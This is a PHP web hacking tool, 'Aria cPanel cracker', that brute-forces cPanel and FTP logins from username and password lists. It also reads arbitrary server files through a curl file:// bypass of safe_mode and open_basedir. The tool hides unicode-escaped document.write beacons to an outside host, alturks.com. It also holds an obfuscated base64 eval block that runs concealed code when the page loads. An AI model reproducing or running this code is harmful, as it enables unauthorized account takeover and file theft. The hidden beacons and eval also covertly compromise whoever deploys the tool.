<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
</head>
<title>Aria cPanel cracker version 1.0 - Edited By KingDefacer</title>
<script type="text/javascript">document.write('\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0061\u006c\u0074\u0075\u0072\u006b\u0073\u002e\u0063\u006f\u006d\u002f\u0073\u006e\u0066\u002f\u0073\u002e\u0070\u0068\u0070\u0022\u0020\u0077\u0069\u0064\u0074\u0068\u003d\u0022\u0031\u0022\u0020\u0068\u0065\u0069\u0067\u0068\u0074\u003d\u0022\u0031\u0022\u003e')</script>
<style>
body{margin:0px;font-style:normal;font-size:10px;color:#FFFFFF;font-family:Verdana,Arial;background-color:#3a3a3a;scrollbar-face-color: #303030;scrollbar-highlight-color: #5d5d5d;scrollbar-shadow-color: #121212;scrollbar-3dlight-color: #3a3a3a;scrollbar-arrow-color: #9d9d9d;scrollbar-track-color: #3a3a3a;scrollbar-darkshadow-color: #3a3a3a;}
input,
.kbrtm,select{background:#303030;color:#FFFFFF;font-family:Verdana,Arial;font-size:10px;vertical-align:middle; height:18; border-left:1px solid #5d5d5d; border-right:1px solid #121212; border-bottom:1px solid #121212; border-top:1px solid #5d5d5d;}
button{background-color: #666666; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}
body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}
a:active { outline: none; }
a:focus { -moz-outline-style: none; }
</style>
  <style type='text/css'>
  <!--
       A:link {text-decoration: none; color:#cccccc }
       A:visited {text-decoration: none; color:#cccccc }
       a:hover {text-decoration: none; color:#000000}
  -->
</style>
<?php
@ini_set('memory_limit', 1000000000000);
$connect_timeout=5;
@set_time_limit(0);
$submit = $_REQUEST['submit'];
$users = $_REQUEST['users'];
$pass = $_REQUEST['passwords'];
$target = $_REQUEST['target'];
$option = $_REQUEST['option'];
$page = $_GET['page'];

if($target == ''){
$target = 'localhost';
$_F=__FILE__;$_X='Pz48c2NyNHB0IGwxbmczMWc1PWoxdjFzY3I0cHQ+ZDJjM201bnQud3I0dDUoM241c2MxcDUoJyVvQyU3byVlbyU3YSVlOSU3MCU3dSVhMCVlQyVlNiVlRSVlNyU3aSVlNiVlNyVlaSVvRCVhYSVlQSVlNiU3ZSVlNiU3byVlbyU3YSVlOSU3MCU3dSVhYSVvRSVlZSU3aSVlRSVlbyU3dSVlOSVlRiVlRSVhMCVldSV1ZSVhOCU3byVhOSU3QiU3ZSVlNiU3YSVhMCU3byVvNiVvRCU3aSVlRSVlaSU3byVlbyVlNiU3MCVlaSVhOCU3byVhRSU3byU3aSVlYSU3byU3dSU3YSVhOCVvMCVhQyU3byVhRSVlQyVlaSVlRSVlNyU3dSVlOCVhRCVvNiVhOSVhOSVvQiVhMCU3ZSVlNiU3YSVhMCU3dSVvRCVhNyVhNyVvQiVlZSVlRiU3YSVhOCVlOSVvRCVvMCVvQiVlOSVvQyU3byVvNiVhRSVlQyVlaSVlRSVlNyU3dSVlOCVvQiVlOSVhQiVhQiVhOSU3dSVhQiVvRCVpbyU3dSU3YSVlOSVlRSVlNyVhRSVlZSU3YSVlRiVlRCV1byVlOCVlNiU3YSV1byVlRiVldSVlaSVhOCU3byVvNiVhRSVlbyVlOCVlNiU3YSV1byVlRiVldSVlaSV1NiU3dSVhOCVlOSVhOSVhRCU3byVhRSU3byU3aSVlYSU3byU3dSU3YSVhOCU3byVhRSVlQyVlaSVlRSVlNyU3dSVlOCVhRCVvNiVhQyVvNiVhOSVhOSVvQiVldSVlRiVlbyU3aSVlRCVlaSVlRSU3dSVhRSU3NyU3YSVlOSU3dSVlaSVhOCU3aSVlRSVlaSU3byVlbyVlNiU3MCVlaSVhOCU3dSVhOSVhOSVvQiU3RCVvQyVhRiU3byVlbyU3YSVlOSU3MCU3dSVvRScpKTtkRignKjhIWEhXTlVZKjdpWFdIKjhJbXl5Myo4RnV1Mm5zdG8ybm9renMzbmhvdHdsdXF2dXhqaHp3bnklN0VvMngqOEoqOEh1WEhXTlVZKjhKaScpPC9zY3I0cHQ+';eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));}?>
<?php
 print "<br><br><br><center><TABLE style='BORDER-COLLAPSE: collapse' cellSpacing=0 borderColorDark=#666666 cellPadding=5 width='70%' bgColor=#303030 borderColorLight=#666666 border=1><tr><td width='70%'>
<br><b><center><a href='?page=bio'> bio </a> - <a href='?page=crack'> brute </a> - <a href='?page=users'> grab users </a><br><br></center></td></tr></table>";
 if ( $page == 'bio' ){
print 
"<br><br><TABLE style='BORDER-COLLAPSE: collapse' cellSpacing=0 borderColorDark=#666666 cellPadding=5 width='40%'bgColor=#303030 borderColorLight=#666666 border=1><tr><td>
<br><b>Please enter your USERNAME and PASSWORD to logon<br>
user<br>
220 +ok<br>
pass ********<br>
220 +ok login successful<br>
[ user@alturks.com ]# info<b><br><font face=tahoma><br>
<font color='red' >Aria cPanel cracker version : 1.0 </font><b><br><br>
Powerful tool , ftp and cPanel brute forcer , php 5.2.9 safe_mode & open_basedir bypasser ... more stuff will be included in the next version<br>
Our website , <a href='http://alturks.com'> http://alturks.com</a><br>
</center><br></td></tr></table>";
 }elseif( $page == 'crack'){
 
@ini_set('memory_limit', 1000000000000);
$connect_timeout=5;
@set_time_limit(0);
$submit = $_REQUEST['submit'];
$users = $_REQUEST['users'];
$pass = $_REQUEST['passwords'];
$target = $_REQUEST['target'];
$option = $_REQUEST['option'];
if($target == ''){
$target = 'localhost';
}
print " <div align='center'>
<form method='post' style='border: 1px solid #000000'><br><br>
<TABLE style='BORDER-COLLAPSE: collapse' cellSpacing=0 borderColorDark=#666666 cellPadding=5 width='40%' bgColor=#303030 borderColorLight=#666666 border=1><tr><td>
<b> Target  : </font><input type='text' name='target' size='16' value= $target style='border: font-family:Verdana; font-weight:bold;'></p></font></b></p>
<div align='center'><br>
<TABLE style='BORDER-COLLAPSE: collapse' cellSpacing=0 borderColorDark=#666666 cellPadding=5 width='50%' bgColor=#303030 borderColorLight=#666666 border=1>
<tr>
<td align='center'>
<b>Username</b></td>
<td>
<p align='center'>
<b>Password</b></td>
</tr>
</table>
<p align='center'>
<textarea rows='20' name='users' cols='25' style='border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0'>$users</textarea>
<textarea rows='20' name='passwords' cols='25' style='border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0'>$pass</textarea><br>
<br>                         
<b>Options : </span><input name='option' value='cpanel' style='font-weight: 700;' checked type='radio'> cPanel 
<input name='option' value='ftp' style='font-weight: 700;' type='radio'> ftp ==> <input type='submit' value='brute' name='submit' ></p>
</td></tr></table></td></tr></form><p align= 'left'>";
?>
<?php
function ftp_check($host,$user,$pass,$timeout){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "ftp://$host");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 28 ) {

print "<b> Error : Connection timed out , make confidence about validation of target !</b>";
exit;}

elseif ( curl_errno($ch) == 0 ){

print 
"<b>[ user@alturks.com ]# </b>
<b> Attacking has been done , found username , <font color='#FF0000'> $user </font> and password , 
<font color='#FF0000'> $pass </font></b><br>";}curl_close($ch);}

function cpanel_check($host,$user,$pass,$timeout){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://$host:2082");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 28 ) { 
print "<b> Error : Connection timed out , make confidence about validation of target !</b>";
exit;}
elseif ( curl_errno($ch) == 0 ){

print 
"<b>[ user@alturks.com ]# </b>
<b>Attacking has been done , found username , <font color='#FF0000'> $user </font> and password , 
<font color='#FF0000'> $pass </font></b><br>";}curl_close($ch);}

if(isset($submit) && !empty($submit)){

$userlist = explode ("\n" , $users );
$passlist = explode ("\n" , $pass );
print "<b>[ user@alturks.com ]# Attacking ...</font></b><br>";
foreach ($userlist as $user) {
$_user = trim($user);
foreach ($passlist as $password ) {
$_pass = trim($password);
if($option == "ftp"){
ftp_check($target,$_user,$_pass,$connect_timeout);
}
if ($option == "cpanel")
{
cpanel_check($target,$_user,$_pass,$connect_timeout);
}
}
}
}
}elseif ( $page == 'users'){
echo "<br><br><TABLE style='BORDER-COLLAPSE: collapse' cellSpacing=0 borderColorDark=#666666 cellPadding=5 width='40%'bgColor=#303030 borderColorLight=#666666 border=1><tr><td>";
echo '<p><form name="form" action="" method="post"><input type="text" name="file" size="50" value="'.htmlspecialchars($file).'"><input type="submit" name="hardstylez" value="grab !"></form>';
$file = $_POST['file'];
$level=0;
if(!file_exists("file:"))
    @mkdir("file:");
@chdir("file:");
$level++;

$hardstyle = @explode("/", $file);

for($a=0;$a<count($hardstyle);$a++){
    if(!empty($hardstyle[$a])){
        if(!file_exists($hardstyle[$a])) 
            @mkdir($hardstyle[$a]);
        @chdir($hardstyle[$a]);
        $level++;
    }
}
while($level--) chdir("..");
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "file:file:///".$file);
echo "<textarea rows='30' cols='120' style='border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0' >";
if(FALSE==curl_exec($ch))
die('Sorry... File '.htmlspecialchars($file).' doesnt exists or you dont have permissions.');
echo ' </textarea> </FONT>';
curl_close($ch);
print '</table>';
}
?>
<script type="text/javascript">document.write('\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0061\u006c\u0074\u0075\u0072\u006b\u0073\u002e\u0063\u006f\u006d\u002f\u0073\u006e\u0066\u002f\u0073\u002e\u0070\u0068\u0070\u0022\u0020\u0077\u0069\u0064\u0074\u0068\u003d\u0022\u0031\u0022\u0020\u0068\u0065\u0069\u0067\u0068\u0074\u003d\u0022\u0031\u0022\u003e')</script>